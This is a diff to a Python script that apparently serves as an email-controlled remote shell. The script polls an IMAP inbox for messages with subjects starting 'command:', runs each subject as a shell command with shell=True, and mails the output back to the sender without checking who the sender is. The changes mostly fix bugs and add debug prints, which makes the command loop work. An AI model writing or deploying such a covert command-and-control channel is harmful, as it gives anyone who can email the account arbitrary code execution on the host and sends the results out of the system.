@@ -15,15 +15,16 @@ class Mailer:
 	def __init__(self,user, passw, server="smtp.gmail.com:587"):
 		self.user = user
 		self.passw = passw
-		self.smtp = SMTP(server)
-		self.smtp.starttls()
-		self.smtp.login(self.user, self.passw)
+		self.mail = SMTP(server)
+		self.mail.starttls()
+		self.mail.login(self.user, self.passw)
 	def send(self,msj, to, sbj=getDate()):
-		mime_message = MIMEText(msj)
-		mime_message["From"] = self.user
-		mime_message["To"] = to
-		mime_message["Subject" ] = sbj 
-		self.smtp.send(self.user, to, mime_message.as_string())
+		mime = MIMEText(msj)
+		mime["From"] = self.user
+		mime["To"] = to
+		mime["Subject" ] = sbj 
+		mime = mime.as_string()
+		self.mail.sendmail(self.user, to, mime)
 
 def getOutput(cmd):
 	resp = run(cmd, shell=True, stdout=PIPE, stderr=PIPE)
@@ -35,6 +36,7 @@ def getOutput(cmd):
 def getFrom(f):
 	f = f.split()
 	f = f[-1][1:-1]
+	return f
 
 def getCommands(conn, smtp):
 	lastmsj = ""
@@ -42,7 +44,7 @@ def getCommands(conn, smtp):
 		sleep(2)
 		try:
 			result, data = conn.uid("search", None, "HEADER Subject 'command:'") 
-		except Exception as e:
+		except Exception as e:	
 			print(e)
 			continue
 		messajes = data[0].split()
@@ -52,10 +54,12 @@ def getCommands(conn, smtp):
 			continue
 		else:
 			lastmsj = messajes[-1]
+			print("New msj.")
 		result, data = conn.uid("fetch", lastmsj, "(RFC822)")
 		raw = data[0][1].decode("utf-8")
 		mail = emailinfo(raw)
 		command = mail["Subject"][8:]
+		print(command)
 		out = getOutput(command)
 		sendto = getFrom(mail["From"])
 		smtp.send(out, sendto, "{} {}".format(command, getDate()))
@@ -74,6 +78,8 @@ def main():
 	cmd = ""
 	while cmd != "exit":
 		cmd = input(">")
+		if cmd == "cls":
+			run("cls", shell=True)
 	exit()
 if __name__ == '__main__':
 	main()
